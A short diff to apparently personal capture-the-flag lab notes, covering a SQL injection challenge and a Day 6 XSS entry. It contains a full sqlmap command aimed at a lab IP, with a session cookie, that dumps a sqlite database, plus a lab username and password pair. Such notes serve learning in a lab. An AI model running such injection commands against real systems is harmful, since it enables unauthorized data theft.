@@ -62,3 +62,10 @@ john:johnstrong
 - Getting the flag took me a really long time since sqlmap did not give me usefull feedback on my mistakes. In the end I had not realized that the dbms should have been sqlite...
 
 sqlmap --url http://10.10.159.207:8000/santapanel?search=abc --method=GET --dbms sqlite --cookie "session=eyJhdXRoIjp0cnVlfQ.X8wDtw.8s8ipE8tFqPzPxWcT9HngM24Ij8" --dump
+
+# Day 6
+
+`export IP=10.10.197.95`
+`http://10.10.197.95:5000`
+
+- Basic XSS, no flag to be found, boring day :(
